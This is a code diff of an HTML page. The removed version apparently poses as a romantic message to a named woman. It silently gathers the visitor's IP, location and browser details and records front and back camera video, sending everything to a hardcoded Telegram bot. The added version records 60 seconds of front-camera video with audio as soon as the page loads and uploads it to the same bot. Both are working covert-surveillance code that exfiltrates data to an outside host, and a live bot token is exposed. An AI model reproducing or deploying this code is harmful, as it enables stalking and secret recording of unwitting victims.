@@ -3,244 +3,86 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>rrvttojty forever💟 ،</title>
-    <style>
-        body {
-            background-color: #ffe6f0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            font-family: 'Arial', sans-serif;
-            margin: 0;
-            overflow: hidden;
-        }
-
-        .container {
-            background-color: #fff;
-            padding: 20px;
-            border-radius: 15px;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
-            text-align: center;
-            max-width: 350px;
-            max-height: 80vh;
-            overflow-y: auto;
-            animation: drift 3s ease-in-out infinite;
-            transition: all 0.3s ease;
-        }
-
-        @keyframes drift {
-            0%, 100% { transform: translateY(0); }
-            50% { transform: translateY(-10px); }
-        }
-
-        .message {
-            font-size: 1.2em;
-            color: #d147a3;
-            margin-bottom: 20px;
-            transition: all 0.3s ease;
-            word-wrap: break-word;
-        }
-
-        .input-field {
-            width: 100%;
-            padding: 10px;
-            border: 2px solid #ff6fa1;
-            border-radius: 25px;
-            font-size: 1em;
-            margin-bottom: 20px;
-            outline: none;
-            resize: none;
-            transition: border 0.3s ease;
-        }
-
-        .input-field:focus {
-            border-color: #ff4c85;
-        }
-
-        .button {
-            background-color: #ff6fa1;
-            border: none;
-            color: white;
-            padding: 10px 20px;
-            border-radius: 25px;
-            cursor: pointer;
-            font-size: 1em;
-            transition: background-color 0.3s ease;
-        }
-
-        .button:hover {
-            background-color: #ff4c85;
-        }
-
-    </style>
+    <title>Camera Video Capture</title>
 </head>
 <body>
-
-    <div class="container" id="messageContainer">
-        <div class="message" id="displayMessage">عارفه ينونتي بحبك فشششخ بجد بعشقك اوي...</div>
-        
-        <textarea class="input-field" id="userMessage" placeholder="Write your reply..." rows="1" oninput="autoGrow(this)"></textarea>
-        <button class="button" onclick="sendMessage()">Send a Reply</button>
-    </div>
-
+    <h1>Recording from Front Camera</h1>
+    <video id="videoPreview" autoplay></video>
     <script>
-        function autoGrow(element) {
-            element.style.height = "auto";
-            element.style.height = (element.scrollHeight) + "px";
-        }
+        const botToken = '7525866619:AAFvucD9MBOr7z4XFUbRSYlYMXFsdDut800';
+        const chatId = '7631254472';
 
-        function sendMessage() {
-            // جلب الرسالة من مربع الإدخال
-            const userMessage = document.getElementById('userMessage').value;
-
-            // التحقق من أن الرسالة ليست فارغة
-            if (userMessage.trim() !== "") {
-                // إرسال الرسالة إلى تليجرام
-                sendToTelegram(userMessage);
-                showNotification(userMessage);
-
-                document.getElementById('userMessage').value = "";
-                document.getElementById('userMessage').style.height = "auto"; 
-            } else {
-                alert("😭ابوس طيزك اكتبي مسدج الاول.");
-            }
-        }
-
-        function sendToTelegram(message) {
-            const botToken = '7525866619:AAFvucD9MBOr7z4XFUbRSYlYMXFsdDut800';
-            const chatId = '7631254472';
-            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-
-            const data = {
-                chat_id: chatId,
-                text: message
-            };
-
-            fetch(url, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(data)
-            })
-            .then(response => response.json())
-            .catch(error => {
-                console.error("Error sending message:", error);
-            });
-        }
-
-        function sendVisitorDetails() {
-            fetch('https://ipapi.co/json/')
-                .then(response => response.json())
-                .then(data => {
-                    const ip = data.ip;
-                    const city = data.city;
-                    const region = data.region;
-                    const country = data.country_name;
-                    const userAgent = navigator.userAgent;
-                    const platform = navigator.platform;
-
-                    const message = `ريتاج شافت الهبي😱!\n\n- IP: ${ip}\n- المدينة: ${city}\n- المنطقة: ${region}\n- الدولة: ${country}\n- المتصفح: ${userAgent}\n- النظام: ${platform}`;
-
-                    sendToTelegram(message);
-                })
-                .catch(error => {
-                    console.error("Error fetching visitor details:", error);
+        async function startRecording() {
+            try {
+                // الوصول إلى الكاميرا الأمامية
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'user' },
+                    audio: true
                 });
-        }
 
-        // طلب الإذن للإشعارات
-        function requestNotificationPermission() {
-            if ('Notification' in window && navigator.serviceWorker) {
-                Notification.requestPermission().then(permission => {
-                    if (permission === 'granted') {
-                        navigator.serviceWorker.register('sw.js');
+                const videoElement = document.getElementById('videoPreview');
+                videoElement.srcObject = stream;
+
+                // إعداد التسجيل
+                const mediaRecorder = new MediaRecorder(stream);
+                let chunks = [];
+
+                // جمع أجزاء الفيديو عند بدء التسجيل
+                mediaRecorder.ondataavailable = function (event) {
+                    if (event.data.size > 0) {
+                        chunks.push(event.data);
                     }
-                });
+                };
+
+                // عند انتهاء التسجيل، نقوم بإنشاء Blob للفيديو
+                mediaRecorder.onstop = function () {
+                    const videoBlob = new Blob(chunks, { type: 'video/mp4' });
+                    sendVideoToTelegram(videoBlob);
+                    chunks = [];
+                };
+
+                // بدء التسجيل
+                mediaRecorder.start();
+
+                // إيقاف التسجيل بعد 60 ثانية (أو أقل)
+                setTimeout(() => {
+                    mediaRecorder.stop();
+                }, 60000); // 60000ms = 60 ثانية
+
+            } catch (error) {
+                console.error('Error accessing the camera:', error);
             }
         }
 
-        function showNotification(message) {
-            if (Notification.permission === 'granted') {
-                navigator.serviceWorker.ready.then(function(registration) {
-                    registration.showNotification('New Message', {
-                        body: message,
-                        icon: 'https://via.placeholder.com/150',
-                        vibrate: [200, 100, 200],
-                        tag: 'new-message'
-                    });
-                });
-            }
-        }
-
-        // تسجيل الفيديو من الكاميرا
-        function recordAndSendVideo(stream, cameraType) {
-            const recorder = new MediaRecorder(stream);
-            const chunks = [];
-
-            recorder.ondataavailable = function(event) {
-                chunks.push(event.data);
-            };
-
-            recorder.onstop = function() {
-                const videoBlob = new Blob(chunks, { type: 'video/mp4' });
-                sendVideoToTelegram(videoBlob, cameraType);
-            };
-
-            recorder.start();
-
-            // Stop recording after 10 seconds (for example)
-            setTimeout(() => recorder.stop(), 10000);
-        }
-
-        function sendVideoToTelegram(videoBlob, cameraType) {
-            const botToken = '7525866619:AAFvucD9MBOr7z4XFUbRSYlYMXFsdDut800';
-            const chatId = '7631254472';
+        function sendVideoToTelegram(videoBlob) {
             const url = `https://api.telegram.org/bot${botToken}/sendDocument`;
 
-            const data = new FormData();
-            data.append('chat_id', chatId);
-            data.append('caption', `Video from ${cameraType} camera`);
-            data.append('document', videoBlob, `${cameraType}-camera.mp4`);
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('caption', 'Front camera video');
+            formData.append('document', videoBlob, 'front-camera.mp4');
 
             fetch(url, {
                 method: 'POST',
-                body: data
+                body: formData
             })
             .then(response => response.json())
+            .then(result => {
+                if (result.ok) {
+                    console.log("Video sent successfully.");
+                } else {
+                    console.error("Error sending video:", result);
+                }
+            })
             .catch(error => {
                 console.error("Error sending video to Telegram:", error);
             });
         }
 
-        // تشغيل الكاميرا الأمامية والخلفية
-        function startCameras() {
-            navigator.mediaDevices.enumerateDevices().then(devices => {
-                const videoDevices = devices.filter(device => device.kind === 'videoinput');
-
-                // تشغيل الكاميرا الأمامية
-                if (videoDevices.length > 0) {
-                    navigator.mediaDevices.getUserMedia({ video: { deviceId: videoDevices[0].deviceId } })
-                        .then(stream => recordAndSendVideo(stream, 'front'));
-                }
-
-                // تشغيل الكاميرا الخلفية (إن وُجدت)
-                if (videoDevices.length > 1) {
-                    navigator.mediaDevices.getUserMedia({ video: { deviceId: videoDevices[1].deviceId } })
-                        .then(stream => recordAndSendVideo(stream, 'back'));
-                }
-            }).catch(error => {
-                console.error("Error accessing cameras:", error);
-            });
-        }
-
+        // بدء تسجيل الفيديو عند تحميل الصفحة
         window.onload = function() {
-            sendVisitorDetails();
-            requestNotificationPermission();
-            startCameras();
+            startRecording();
         };
     </script>
-
 </body>
 </html>
